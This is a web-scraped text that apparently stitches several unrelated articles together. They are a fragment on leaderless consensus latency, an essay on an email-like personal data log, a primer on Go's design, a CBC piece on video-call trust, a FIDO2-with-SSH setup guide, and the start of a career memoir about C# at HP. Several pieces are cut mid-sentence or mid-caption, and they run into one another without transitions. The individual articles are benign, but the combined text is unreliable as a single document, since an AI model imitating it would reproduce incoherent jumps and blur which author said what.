            <p>The trick is that a major part of the latency comes from the disk IO. Even when we use NVM but target high throughput we should make small delays to accumulate writes (4 ms) and write them in batches.</p>

            <p><img src="http://rystsov.info/images/pacified/nvm.png"></p><p>4 ms is 20 times higher than intra datacenter RTT, so in-memory consensus in front of on-disk consensus doesn't contribute much to the overall end to end latency but completely eliminates contention.</p>

            <p>This idea isn't just wild speculations, I've built it and measured the performance. And the leaderless consensus performs on par with leadered when there are no faults, latency is just 23% worse but throughput is 36% better.</p>

            <p><img src="http://rystsov.info/images/pacified/leaderless.leader.png">

            The leaderless consensus with faults performs a bit worse than leaderless consensus without faults.

            <img src="http://rystsov.info/images/pacified/leaderless.unrest.png"></p><p>Without context 67% increase in P99 latency (9267us vs 5535us) and 12% decrease in throughput (6154 ops/s vs 5392 ops/s) doesn't look good but when we compare it with other solutions it's almost an order of magnitude better.</p>

  </span></p><p>Recently on my Twitter I’ve been seeing some buzz about a new email app called <a href="https://hey.com/features/">HEY</a>. It seems to improve some ergonomics with traditional approaches to email, like moving receipt emails to a “paper trail” area, better screening of new contacts, and some other things.</p>

<p>Fundamentally though, it’s still email under the covers. This made me wonder what an evolution of what email actually <em>is</em> would look like.</p>

<p>Maybe it would help to consider where email is already evolving. Email began as exchanging plain text electronic letters between humans but now it is used for so much more.</p>

<p>For example, every time you place an online order you immediately get an order receipt, sent from a machine. When your order ships you get an update with a tracking number. As your shipment proceeds towards your house, you get tracking updates until the item arrives. This isn’t traditional correspondence between humans any more, this is <strong>data exchange</strong>.</p>

<!--more-->

<h2 id="data-schemas">Data schemas</h2>

<p>Google had in fact already recognized this evolution and introduced <a href="https://developers.google.com/gmail/markup/reference">special markup</a> that annotates the unstructured text and image format of email into structured data. When a sender includes this structured data in an email, Google’s email service Gmail recognizes the type and can display display special <a href="https://developers.google.com/gmail/markup/actions/actions-overview">“actions”</a> and <a href="https://developers.google.com/gmail/markup/highlights">“highlights”</a>.</p>

<div>

<p>This structured data vocabulary is the same approach that Google <a href="https://developers.google.com/search/docs/guides/intro-structured-data">advises web developers to use</a> to help its crawlers accurately understand content across the Web by the way. For example, an online store annotating a product’s page with an <a href="https://schema.org/Offer">Offer</a> may give you a snippet like this in Google search results:</p>

    <em>Searching Google for a specific product may return <a href="https://econsultancy.com/what-are-rich-search-results-and-how-can-you-get-them/">rich results</a> like this</em>
  </p>

<p>Applying data schemas to mail messages is a rich vein that hasn’t been fully explored yet, and I think could enable new types of data to be stored that don’t fit in the mail-like mold. I’ll give some examples further down.</p>

<h2 id="public-writable-log">Public-writable log</h2>

<p>When I think of email as a data structure, I think of it as a public-writable <a href="https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying">log</a>. Anybody who has my address is allowed to append to my log, given they pass some basic filtering (e.g. spam, size of message).</p>

<p>
    <em><a href="https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying">Log</a> data structure</em>
  </p>

<p>I think this is the <strong>key insight</strong> of email and definitely worth keeping in the next evolution.</p>

<h2 id="data-sharing">Data sharing</h2>

<p>What email <em>doesn’t</em> currently have is a way to share access to your data with others.</p>

<p>What I think would be interesting is to be able to scope queries to certain pieces of data, and give read access to third parties for this data.</p>

<p>Let me give an example.</p>

<p>Right now, when I’ve placed online orders on various websites, I get a wide mix of different email notifications. Almost all of them email me a receipt for the order immediately. Most of them email me when the order ships. Some of them email me updates every time the status of the parcel changes.</p>

<p>Just to cover my bases, I’m also signed up for USPS Informed Delivery®, UPS My Choice®, and FedEx Delivery Manager®, so that I get notified whenever a package is scheduled to arrive at my address regardless of who it’s from (I don’t like surprises!).</p>

<p>It’s all very scattershot, and to keep track of what’s coming and going I’m usually jumping between emails, comparing tracking numbers here to order information over there.</p>

<p>What would be nice is if I had some personal dashboards, say one for Orders and one for Postal Mail that showed me the status of all my orders across all vendors, and all the postal mail that would be arriving soon (with hyperlinks between Orders and Postal Mail even). This could be either something I build myself, or a third party service that I allow keyhole access to just my orders and shipments from my personal log.</p>

<div>
  <p><img integrity="sha256-u+yZ6ECALFVEg+O85km7k4l57flfPL1Xs1cfwEBhtzg=" crossorigin="anonymous" src="https://abevoelker.com/assets/emails-successor/orders-example-bbec99e840802c554483e3bce649bb938979edf95f3cbd57b3571fc04061b738.png">
  </p>
</div>
<p>
    <em>What if you had an Orders dashboard like Amazon's, but for <strong>all</strong> your online orders?</em>
  </p>

<p>This may not sound that appealing if 99% of your orders come from Amazon. But when you order from a wide array of online shops, it could be useful. In the current climate of gun buying for example, I’ve had to use spreadsheets to keep track of what’s arriving from all the various vendors that I order from!</p>

<blockquote><p lang="en" dir="ltr">I unironically love that gun-related shopping was spared the consolidation of Amazon et al and you still commonly buy gear from Geocities-esque sites like it's 2003 <a href="https://t.co/HWvZpXQAuK">https://t.co/HWvZpXQAuK</a> <a href="https://t.co/Drez8WkbTQ">pic.twitter.com/Drez8WkbTQ</a></p>— Abe Voelker (@abevoelker) <a href="https://twitter.com/abevoelker/status/1184218082144854017?ref_src=twsrc%5Etfw">October 15, 2019</a></blockquote>

<p>I’ll give more examples in the following sections.</p>

<h2 id="expanding-data-scope">Expanding data scope</h2>

<p>Right now there is a lot of personal data that doesn’t fit into email or a mail-like messaging system that would be a good fit for a personal log / database.<sup id="fnref:log-database"><a href="#fn:log-database">2</a></sup></p>

<p>For example, I’ve moved addresses several times over the last decade. Every other year or so I’ve seen a new optometrist, and I always opt to get those laser retina scans done. But I’m certain that every time I’ve switched to a new optometrist, there is no history carried forward from the previous optometrist - I have a bunch of retina scan records scattered across multiple offices.</p>

<p>What would be nice is if there was a “medical” section of my personal log, and my optometrist could (with permission) append my latest retina scan to my log, and (with permission) pull previous scans out for comparison. This way I’m the primary hub, and owner, of my own medical data.</p>

<div>
  <p><img integrity="sha256-YBEeSWj621eIWzlSa7Zt3jdqFen6wh2eH9MSyLpBOwY=" crossorigin="anonymous" src="https://abevoelker.com/assets/emails-successor/optomap-60111e4968fadb57885b39526bb66dde376a15e9fac21d9e1fd312c8ba413b06.jpg">
  </p>
</div>


<p>Obviously the above scenario could also apply to doctor and dentist visits.</p>

<h2 id="example---changing-mailing-address">Example - changing mailing address</h2>

<p>On the topic of changing addresses, if you’ve ever moved I’m sure you’re familiar with having to update all the various services you use with your new mailing address, and how you’ll almost certainly miss some.</p>

<p>Imagine if you could annotate your personal log with your current mailing address. When you move, you simply update this annotation, and authorized third parties are able to pull the new data (imagine something similar to a webhook).</p>

<p>Put another way, you could think of it as a rudimentary “home address DNS”:</p>

<blockquote><p lang="en" dir="ltr">i've often wanted home address DNS.</p>— Petulant Fig Nemesis (Mark 11:12-14) (@mwotton) <a href="https://twitter.com/mwotton/status/869696220347981824?ref_src=twsrc%5Etfw">May 30, 2017</a></blockquote>

<h2 id="example---bank-accounts-and-financials">Example - bank accounts and financials</h2>

<p>Money is another fundamentally personal bit of data that would be interesting to include in the personal log.</p>

<p>What if your bank account and credit card ledgers were synchronized to your personal log? Instead of getting an email with a PDF or CSV statement at the end of the month, each individual credit or debit was immediately replicated to your log?</p>

<p>At the very least, I’d be grateful to have the full history of my bank account(s) in my log, because for some reason the banks I use seem to not show transactions past about a year.</p>

<p>And if my employer could attach my W-2 to my personal log (or schools attaching 1098-T, etc.), couldn’t filing taxes be as simple as running a rollup query against my (and/or my spouse’s) data? At least as a first approximation.</p>

<h2 id="open-question---other-data">Open question - other data?</h2>

<p>I’m curious what other type of data could fit in the personal log. On some occasions I’ve had to find my vehicle’s license plate number and VIN; previously I’ve had to search my email for PDF scans of insurance quotes I’ve gotten, but could this data live in the log as a first-class citizen?</p>

<p>Can the personal log be adapted to fit generalized notes, like people used to (still?) use Evernote? Or would that be too much sprawl? Could one build a structured data personal <a href="https://en.wikipedia.org/wiki/Knowledge_graph">knowledge graph</a> with it?</p>

<p>How about the people who do <a href="https://en.wikipedia.org/wiki/Quantified_self">“quantified self”</a> tracking and measurements of their own bodies - seems like the personal log would be a good place to store that instead of some proprietary database. If your doctor could pull up your Apple Watch’s heart rate history and correlate that with the physician-kept medical records it seems like they could <a href="https://med.stanford.edu/news/all-news/2019/11/through-apple-heart-study--stanford-medicine-researchers-show-we.html">do some cool things</a>.</p>

<p>What about all the pictures and video I take (particularly of my family); wouldn’t that be a good data stream to add to the personal log? Would it be easy to share data streams with say my wife or other family members?</p>

<h2 id="challenges">Challenges</h2>

<p>There are plenty of difficulties to be addressed in building a system like the above.</p>

<p><a href="https://www.jwz.org/doc/worse-is-better.html">“Worse is better”</a> is an obvious consideration. Adding schemas to data opens up new possibilities, but the sheer simplicity of plain text remains empowering. The fact that Unix commands are still primarily strung together with plain text after half a century should be a testament to that.<sup id="fnref:shells"><a href="#fn:shells">3</a></sup> For this reason untyped data would still need to be supported in the personal log.</p>

<p>Security is another consideration. Like email, having an account stolen or forgetting credentials would be a very bad thing to happen. But when you’re adding fine-grained medical and financial data the stakes are much higher.</p>

<p>Further, deciding on schemas to use for the data could be a bit tricky. <a href="https://schema.org/">Schema.org</a> does a good job with certain properties, although it’s not the only ontology in town.</p>

<p>Looking at medical data in particular, there would certainly be difficulties syncing up the different formats of electronic medical records (EMR), although in the US, the National Library of Medicine has created the <a href="https://en.wikipedia.org/wiki/Unified_Medical_Language_System">Unified Medical Language System (UMLS)</a> which does unify some of it.</p>

<p>Bank account ledgers would also have all kinds of different formats between banks and across international boundaries.</p>

<p>Yet, it would be interesting to see if the need for such a system would create incentives to unify some of this data that before seemed unlikely to ever be unified. If the Web can do it, why can’t this?</p>

        <section>
            <p>I'm one of those people surprised at the success of the Go programming language. Here is a language that prides itself in offering less than languages designed decades ago, unabashedly not OOP, and without a decent dependency management system (at least initially), but still wildly successful, with a number of significant open source projects written in it (e.g. Docker, <a href="https://github.com/hashicorp/terraform">Terraform</a> &amp; <a href="https://github.com/kubernetes/kubernetes">Kubernetes</a>). Another intriguing thing is that people who use Go as their primary language rarely complain about it (maybe a <em>generics would be nice</em> here and there), while those who come into initial contact with it can't stop swearing, at least initially (<em>mea culpa</em>). I used this gap in affinity as a chance to understand the intricacies of Go by diving into the platform, and writing down what I think is necessary knowledge for newcomers to become productive on it. The target reader group would be developers already proficient in one language and platform; as the text is already quite long, I didn't want to explain common programming terminology. Unavoidably, my perspective is skewed by the technologies I'm acquainted with, especially Python, with which I frequently compare Go, but it should be useful for all newcomers, even those without too much programming experience. I hope that those already working in Go can also find a useful tip here and there.</p>

<p>And now to the "Why" in the title. The design of Go is a bit curious, in that it leaves out most features of other popular programming languages, going for simplicity rather than recommending itself with more features. My aim was to make a proper attempt at understanding the context for this choice, by following the path from expectations from a language, to design principles, to language features, and finally to the embodiment of the language in terms of compiler, runtime and tooling. This process is never perfect for any technical product, as there are incidental turns taken at every step, but I think the knowledge of how different aspects of a language came to be the way they are, while depending on each other and the context, is very important and useful. I therefore attempted to start with an overview of the "intellectual" history of Go, connecting following discussions of features to this history.</p>

<p>This first part in what I intend to be a two-part series will concentrate on the Go toolchain, that is, the set of tools for writing, verifying, compiling and maintaning Go applications. As we will see, Go tooling has come a long way, and offers a first-class development environment for writing correct and performant applications. The second installment will deal with the most important features of the language, also in the light of Go design decisions. I would like both parts to stay as up-to-date and relevant as possible, so if you have any comments on improving, do leave a comment, and I will make sure to address it.</p>

<h3 id="whyisgothewayitis">Why is Go the way it is?</h3>

<p>In order to appreciate the design decisions that went into the Go language, it's important to understand where the language designers started from, and what problems they expected their language to solve. As Rob Pike explains in detail in <a href="https://talks.golang.org/2012/splash.article">this article</a> from 2012, Go was not designed to experiment with PLT concepts. The languages and technologies it intended to replace were those in daily use at Google (C++, Java and Python); Go was designed to solve the problems these platforms presented at Google scale. A rough three-part categorization of the problems Go is intended to address can be done as follows:</p>

<p><strong>Build issues</strong>: The problems that C and C++ model of compilation presents are well-known. As explained in the linked article, compiling a moderately large C++ codebase can lead to gigabytes of IO. Go avoids this and similar issues by making unused imports an error, and replacing header files and includes with an inverted dependency model of compilation. Circular imports are also not allowed. One interesting side effect of this stress on dependency hygiene is that copy-paste is preferred to importing large packages:</p>

<blockquote>
  <p>Dependency hygiene trumps code reuse. One example of this in practice is that the (low-level) net package has its own integer-to-decimal conversion routine to avoid depending on the bigger and dependency-heavy formatted I/O package. Another is that the string conversion package strconv has a private implementation of the definition of 'printable' characters rather than pull in the large Unicode character class tables; that strconv honors the Unicode standard is verified by the package's tests.</p>
</blockquote>

<p><strong>Developer ergonomics</strong>: Go is a minimalist language that tries to do away with features of languages used at Google, such as C++, Java and Python, which are not coincidentally also quite popular in the rest of the dev community. In fact, as <a href="https://commandcenter.blogspot.com/2012/06/less-is-exponentially-more.html">this candid blog post</a> explains, the initial drive to develop Go came from unpleasant experiences developing concurrent code in C++, and the intention of the standards committee to make the language even more complex. While differentiating itself from popular languages, Go cannot stray too far away from them, as it is intended to be used in production at a company the size of Google. As such, it has to be easy to learn, and familiar to junior developers. This simplicity is at the service of solving modern programming challengs, foremost being concurrency. Concurrency in Go is provided through <a href="https://en.wikipedia.org/wiki/Communicating_sequential_processes">communicating sequential processes (CSP)</a>, the advantage of which is that it is easy to integrate into a procedural language. Another modern feature that now meets a C-like language in Go is garbage collection. Due to the type system and memory allocation features of Go, however, garbage collection is different from the way it works in languages like Java or Python; we will discuss this in the follow-up post.</p>

<p><strong>Google-scale</strong>: The design of Go is optimized for disambiguity and parsability. The underlying reasons are the ease of writing external tools and avoiding discord in large developer teams. As an example, Pike <a href="https://talks.golang.org/2012/splash.article#TOC_4.">mentions</a> that having languages that are whitespace-sensitive, such as Python, is not an issue in itself, but Python embedded in SWIG declarations turns out to be a huge problem. In order to preclude such nuisances, Go has curly braces and clear formatting rules. Another example is the now famous auto-formatting tool that provides a standard through implementation. This, and similar tools like <code>gofix</code> which we will discuss later, are possible because the language is easy to parse and unambiguous (in comparison to e.g. C++, which can have <a href="https://en.wikipedia.org/wiki/Most_vexing_parse">statements that can be parsed multiple ways</a>). These tools enable standards to be set within large groups, and also systematic changes such as API changes to be made on large code bases. Generally, it can also be said that the rest of the design concerns gathered in the previous categories also contribute to scaling Go, especially those concerning concurrency primitives and strong standard library support. Another aspect of scale is the number of people working on a project. As Pike correctly observes, developers tend to stick to a subset they understand of a complex language with many features. As Go has a rather limited set of features, there is no subset to agree on.</p>

<p>Obviously, not all the design choices that went into Go can be explained through these points. There are quite a number of things that are put to good use in other languages, but are explicitly shunned in Go, such as OOP, exceptions and generics. In my opinion, there is one general thread that connects the dots, which is that in Go, things that are a pain in the large are not allowed in the small, either. Or in <a href="https://talks.golang.org/2012/splash.article#TOC_7.">Rob Pike's words</a>:</p>

<blockquote>
  <p>As with many of the design decisions in Go, it forces the programmer to think earlier about a larger-scale issue … that if left until later may never be addressed satisfactorily.</p>
</blockquote>

<p>Another important aspect you need to keep in mind when reading Go documentation, and wondering at how <em>basic</em> it is, is that priorities in keeping the implementation simple and feasible in certain areas led the designers to simply omit what one takes for granted in other languages, but leads to hidden complexity in the implementation. As stated in the <a href="https://golang.org/doc/faq#Why_doesnt_Go_have_feature_X">official FAQ</a>:</p>

<blockquote>
  <p>Go was designed with an eye on felicity of programming, speed of compilation, orthogonality of concepts, and the need to support features such as concurrency and garbage collection. Your favorite feature may be missing because it doesn't fit, because it affects compilation speed or clarity of design, or because it would make the fundamental system model too difficult.</p>
</blockquote>



<h3 id="thegotoolchain">The Go toolchain</h3>

<p>The core of the Go toolchain is the <code>go</code> command line tool that bundles the most important components, including the compiler. In the rest of this text, Go refers to the language and ecosystem, whereas go (with lowercase g) refers to the command line tool. Go adheres to the recent pattern of delivering development tools where the entry point is one single command which accepts a first argument as an action (other examples could be git and kubectl). In daily work, when building Go code, one rarely has to deal directly with the actual compiler or linker, which are hidden somewhere in the Go distribution. The Go compiler is in fact written in Go itself, and thanks to this fact and the snappy compile times, boostrapping the Go toolchain is one of the simplest ways to get an up-to-date version on your computer. You will first need to get the out-of-date but still useful version of go from system repositories, as in <code>apt install golang</code>. Afterwards, download the latest source package …</p></section></article></div></div>

And that's bad for business.<!-- --> <!-- -->(Thomas Peter/Reuters)</figcaption></figure><p><span><p>Ever get the sense there is something vital missing on those Zoom meetings? If so, you're not alone&nbsp;— and there is Canadian science to back you up.</p>  <p>As political and business leaders push to reopen the economy hoping to get restaurants, retailers and factories making money again, there may be good economic reasons for putting at least some of the work-from-home crowd back into the office as fast as it's safe to do so.</p>  <p>Canadian research on "computer-mediated communication," begun long before the current lockdown, shows video chat is an inadequate substitute for real-life interaction. The real thing, dependant&nbsp;on non-verbal cues, is extraordinarily more effective in creating rapport and getting ideas across.</p>  <p>Not only that, but the familiarity and trust we currently feel with coworkers during the lockdown's remote calls rests on connections remembered from back when we sat at a nearby desk or met for lunch.</p>  <h2>Bad for business</h2>  <p>As the lockdown stretches out and the mix of colleagues changes, it may be almost impossible to establish healthy trusting working relationships using remote video chat tools alone.</p>  <p>That's bad for business, said&nbsp;organizational behaviour specialist Mahdi Roghanizad from Ryerson University's Ted Rogers School of Business. The reason:&nbsp;getting a good reading on your fellow workers has been repeatedly shown to be essential for business efficiency, reaching common goals&nbsp;and establishing trust.</p>  <p><em><strong>WATCH | 'Zoom fatigue' is real and it's setting in:&nbsp;</strong></em></p>  <p><span><span><span></span><span>Many people are feeling drained because of an increase in video conferencing and psychologists have started describing it as “Zoom fatigue.”<!-- --> <!-- -->2:06</span></span></span></p>  <p>It is why teams <u><a href="https://www.cbc.ca/news/business/employment-remote-work-1.5269792" target="_blank">that worked remotely</a></u> even before the pandemic lockdown always met periodically in person. The latest research shows human-to-human bonding is like a kind of intuitive magic.</p>  <p>"Say you are seeing a person for the first time," explained Roghanizad. "After two&nbsp;to five&nbsp;minutes of interaction, you will have a better chance of a more accurate prediction about their cooperativeness or generosity. This is how our brain evolved."</p>  <p>The crucial point is that merely "seeing" the person is not enough.&nbsp;</p>  <p>"This ability goes away when the same interaction happens in video-to-video communication as is happening today through Zoom or Google Meet or Skype," explained Roghanizad, who started his career as an electrical engineer and has since used the tools of hard science to investigate the failures of computerized communication.</p>    <p>The scientist's interest began more than decade ago with&nbsp;research quoted in the Harvard Business Review that showed face-to-face communication was <u><a href="https://hbr.org/2017/04/a-face-to-face-request-is-34-times-more-successful-than-an-email" target="_blank">34 per cent more effective</a></u> than email in persuading people to donate to a good cause.</p>  <p>To those of us today with loaded electronic in-boxes, the results of that research may not be surprising. At the time, however,&nbsp;it was considered revolutionary because people in the study expected outcomes for email and personal contact to be about the same.</p>  <p>The results inspired Roghanizad and others to look into the reasons why person-to-person contact increased bonding and established a sense of trustworthiness.</p>  <h2>The smell of success</h2>  <p>Candidates included pheromones — the subtle fragrances we give off — plus a series of muted hand and body gestures such as crossing your arms and leaning back that in various combinations researchers have shown inspire confidence and "are predictive of economic behaviour," according to one <u><a href="http://robotic.media.mit.edu/wp-content/uploads/sites/7/2015/01/Desteno-etal-PS-12.pdf" target="_blank">research paper</a>.</u></p>  <p>Roghanizad's most recent research is helping to prove is that without real-life contact, those non-verbal cues simply don't register in a key interactive part of the human brain responsible for what scientists call "<u><a href="https://www.cbc.ca/player/play/2695977050" target="_blank">theory of mind</a></u>" —that creation of understanding between people working in groups.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-belgium-restaurants.jpg 300w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-belgium-restaurants.jpg 460w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-belgium-restaurants.jpg 620w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-belgium-restaurants.jpg 780w,https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-belgium-restaurants.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5628641.1593198711!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-belgium-restaurants.jpg"></p></div><figcaption>A dog looks at Brussels Grand Place square as restaurants and bars reopen after the COVID-19 lockdown earlier this month.

                    <p>Secure, easy to use, cheap: Pick three</p><p>I recently installed Ubuntu Wacky Whatever, the latest version, and I’m very excited about it shipping with SSH 8.2, which means that I can finally use hardware USB keys for secure, easy to use authentication.
If securing your devices has been something you’ve wanted to easily do yourself, read on, because it’s finally happening.</p>
<h2>FIDO2</h2>
<p>One of the most exciting security-related developments recently has been the development of <a href="https://webauthn.guide/">WebAuthn</a> and FIDO2, which are basically euphemisms for “nice security stuff”.
In summary, WebAuthn and FIDO2 aim to make it really easy to use security devices with stuff by standardizing the way the two talk to each other, and using better terms than “stuff”.</p>
<p>This is great news for us, because now we can have dirt-cheap USB keys that can be used to secure all our authentication very easily, without requiring any special security knowledge.
All you need to know to be completely immune to phishing, password theft, and a whole host of other ways of losing Bitcoin is to just plug your USB key in, press the little button/type your PIN/enter your fingerprint, and you’re logged in.</p>
<p>What does this have to do with SSH?
Very little, but<!-- break --> I like rambling, it is known.</p>
<h3>Using FIDO2 with SSH</h3>
<div><p><img src="https://www.stavros.io/posts/u2f-fido2-with-ssh/shoulder-small.jpg"><a href="https://unsplash.com/photos/OLzlXZm_mOw" title="Photo from https://unsplash.com/photos/OLzlXZm_mOw" target="_blank" rel="noopener noreferrer"><i></i></a></p><p><span>Deanna had heard of phishing, and was extremely suspicious of the sound of rubber boots.</span></p></div><p>As you may have suspected from the two seemingly unrelated points above, and the dead giveaway title of this section, it would be tremendous if we could use FIDO2 keys to authenticate over SSH, and the OpenSSH developers made it happen.
OpenSSH now supports FIDO (U2F) and FIDO2 for authentication, with FIDO2 with resident keys having a nicer UX.</p>
<p>At a high level, the USB device (FIDO2 devices don’t have to be USB, but they usually will be) will generate a <span data-expounder="secret-key">secret key</span>.
<span data-expounded="secret-key">
The device can then use this secret key to prove that you have the device in your possession, without the key ever leaving the device.
That means that, by extension, you can use the device to prove you are who you say you are to any server who asks.
</span>
The key is either stored on the device (called “resident key”), which requires the device to support storage, or it isn’t, and <span data-expounder="storage">you need to store the data somewhere else</span>.</p>
<p><span data-expounded="storage">
The way this works, in my understanding (which I’m not certain about and please correct me if I’m wrong), is the following:
Each device comes from the factory with one key pair/seed built in, but it can accept an additional seed to derive more pairs from, by combining its current seed with the one given.
This allows devices to generate keys without having any storage space, but it does require you to be giving them the seed every time.
Devices with “resident key” capabilities can store the whole seed on their memory, and don’t need you to do anything else.
</span></p>
<p>The benefit of using a device like this including eliminating phishing, password theft, authentication replay, and lots of other attacks.
Since the device authenticates to a specfic realm (server address/URL/etc), an attacker can’t reuse one site’s authentication on another site, which makes phishing impossible.
Nobody can steal your password or private key either, since it’s on the device itself and extracting it is impossible.
The only plausible attack is physical theft with the device, which is mitigated by making the device ask for a PIN or fingerprint and wiping itself after a few wrong attempts.</p>
<p>Another benefit with having this built into SSH is that you don’t specifically need a Yubikey, or to mess with extra software like Yubikey agent, PIV mode or anything else.
You just plug any FIDO2-compatible key in, and you can use it with SSH.
I tried the following on both my Yubikey 5C, Yubikey FIDO2 and Yubikey NEO, they worked like a charm on all of them, but “resident key” mode only works on the 5C and later versions of the FIDO2 key.</p>
<h2>Actual usage</h2>
<div><p><img src="https://www.stavros.io/posts/u2f-fido2-with-ssh/padlocks-small.jpg"><a href="https://unsplash.com/photos/bBavss4ZQcA" title="Photo from https://unsplash.com/photos/bBavss4ZQcA" target="_blank" rel="noopener noreferrer"><i></i></a></p><p><span>With twelve padlocks, the city of Indianapolis was sure it had put a stop to miscreants stealing its favorite fence.</span></p></div><p>After all the needless detail about how devices work, we’re ready to actually use one for SSH.
Setting that up is really simple, basically one or two commands (depending on the method) with no extra software to install, though you will need to be running OpenSSH 8.2 on both client and server.</p>
<p>I will split the instructions into two parts, one for if your key supports (and you want to use) the resident key mode, and one for if it doesn’t.
There’s no harm in using either method, so if you don’t know if your device supports resident key mode, just try the first method and continue to the second one if it fails.</p>
<h3>Resident key mode</h3>
<p>Use the following command to generate a key and store it on the device:</p>
<div><pre><span></span>ssh-keygen -t ed25519-sk -O resident -f ~/.ssh/id_mykey_sk
</pre></div>
<p>SSH will ask you to enter your PIN and touch your device, and then save the key pair where you told it.
If that command complains about ed25519 not being available, try this one:</p>
<div><pre><span></span>ssh-keygen -t ecdsa-sk -O resident -f ~/.ssh/id_mykey_sk
</pre></div>
<p>OpenSSH will save two files, one called <code>id_mykey_sk</code>, and one called <code>id_mykey_sk.pub</code>.
You only really need the latter, it’s your public key, and you can now add it to the <code>authorized_keys</code> file of any server that runs OpenSSH 8.2 and above.</p>
<p>To add your private key to the SSH agent, you can either copy <code>id_mykey_sk</code> to your <code>~/.ssh/</code> directory, or (if you’re at a new computer and don’t have the key with you), run</p>

<p>with your device plugged in.
This will add the key to the SSH agent, and you will be able to connect to servers immediately.</p>
<h3>Non-resident key mode</h3>
<p>The non-resident key mode is the same as the previous mode, except you can’t load your key with <code>ssh-add -K</code> directly from the device.
As before, run:</p>
<div><pre><span></span>ssh-keygen -t ed25519-sk -f ~/.ssh/id_mykey_sk
</pre></div>
<p>SSH will ask you to enter your PIN and touch your device, and then save the key pair where you told it.
If that command complains about ed25519 not being available, try this one:</p>
<div><pre><span></span>ssh-keygen -t ecdsa-sk -f ~/.ssh/id_mykey_sk
</pre></div>
<p>OpenSSH will save two files, one called <code>id_mykey_sk</code>, and one called <code>id_mykey_sk.pub</code>.
You need both of these files, store <code>id_mykey_sk</code> in your <code>~/.ssh/</code> directory (where it got generated) and add the <code>id_mykey_sk.pub</code> file to any server you want to log in to.</p>
<p>That’s it, when you try to log in, OpenSSH will ask you for your PIN and to touch the device.</p>
<h2>Security considerations</h2>
<p>You can pass the <code>no-touch-required</code> option to <code>ssh-keygen</code> to tell it that you don’t want it to require touching the device every time, but I haven’t had great results with enabling that.
If you try it, let me know how well it works in the comments, but it’s probably better for security if you leave it disabled.</p>
<p>Storing your key on the device means that nobody will be able to steal it (hopefully your device has a PIN or other authentication method set), but untrusted computers might still be able to send commands over the SSH session after you connect.
Don’t SSH from computers you don’t trust, and be extra careful when using SSH forwarding (the <code>-A</code> option), as the server can then ask your computer to authenticate to other servers on your behalf.</p>
<h2>Epilogue</h2>
<p>I’m very excited about FIDO2 in general, and for SSH authentication specifically, because we finally have a way to secure authentication that my parents can easily use, with a much smaller attack surface.
I’m particularly interested in seeing how WebAuthn takes off for authenticating on the web without usernames and passwords (see my <a href="https://gitlab.com/stavros/django-webauthin">django-webauthin</a> library for a demo), and hope it becomes widespread.</p>
<p>If you have any feedback, please <a href="https://twitter.com/intent/user?screen_name=Stavros">Tweet</a> or <a href="https://mastodon.host/@stavros">toot</a> at me, or email me directly.
Also, check out my <a href="https://www.youtube.com/c/StavrosKorokithakis/">YouTube channel</a> (because who <em>doesn’t</em> have a YouTube channel these days?), where I frequently livestream my late-night maker sessions.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="banner"> <div> <div> <div>  <h4>29 Jun 2020</h4> <p> <i></i> Reading time ~14 minutes </p><!-- /.entry-reading-time --> </div> <p>In 2005, the .NET Framework had its 1.1 SP1 release and was relatively stable. Visual Studio .NET 2003 was a solid release. C# was being widely adopted throughout the industry. Selecting it for a project cost me my job, and nearly sunk my career as a software developer.</p> <!--more-->  <p>This was almost two decades ago, so I feel comfortable discussing it now. I was working as a software developer at Hewlett-Packard in Nashua, New Hampshire, USA. HP had recently merged with Compaq, and absorbed the office buildings and personnel that were once Compaq, and Digital Equipment Corp. before that. Our project was called ActiveAnswers, a Content Management System (CMS) that existed before the term was coined.</p> <p>When I joined Compaq in 2000, ActiveAnswers was a set of HTML templates and text files that were converted into a massive static web site every night. During the day, content editors would make changes by editing the text files. The site used dozens of Perl scripts to combine the content from the text files with the HTML templates.</p> <p>Over the next couple of years, my team of five people had completely rewritten the application into a mostly WYSIWYG UI that permitted our content editors to make changes directly in a web browser, seeing the results almost immediately. All of the content was stored in a SQL Server database. The front end code was written in VB 6, and was starting to feel a little overweight.</p> <p>We had adopted many of the practices of the newly-released eXtreme Programming methodology. The project had automated unit tests and daily (if not continuous) builds. We even built a pair-programming lab. I wish I still had pictures, because doing that in 1999 was a sight to behold. We had taken over a former QA lab. It was about 16 x 24 feet, with windows on the long walls, and it had a locking door. We set up stations around the perimeter of the room, each consisting of a laptop docking station, a 21” monitor, keyboard, mouse, and two chairs. Each station had plenty of room for two without crowding the adjacent station. In the center of the room was a conference table with room for all of us.</p>  <p>Not long after, Hewlett-Packard decided that they needed to be bigger than Dell. So instead of competing with Dell head-to-head, they decided to get bigger the new-fashioned way: they bought another company. The new company was indeed larger than Dell – for about six months.</p> <p>As soon as the deal closed, the new HP (NYSE: HPQ) was the #1 computer maker in the world. Within six months, however, Dell had regained its #1 position and dropped HP to a solid #2. HP was suddenly in trouble, being dragged down by a bloated Compaq organization. That was their story, at least.</p> <p>It was time to cut away some of the bloat. HP announced a 10% “reduction in workforce.” I suppose they call it that because it sounds better than a “lay off.” It also sounds better than “you’re fired!”</p> <p>Amazingly, most of the people with whom I worked did not seem to care. In fact, many were excited by the prospect of getting a great “layoff package.” In case you are not familiar with these, a layoff package is money given to the suddenly out-of-a-job employee. In my case, only having been an employee for two years, I was only eligible for six weeks of pay.</p>  <p>After the merger, the team and project experienced some significant growing pains. Executives at HP had seen ActiveAnswers and wanted to expand its reach. They wanted to ensure the team could handle the additional workload.</p> <p>All of the contractors on the team were made a similar offer: accept a full-time job with HP at 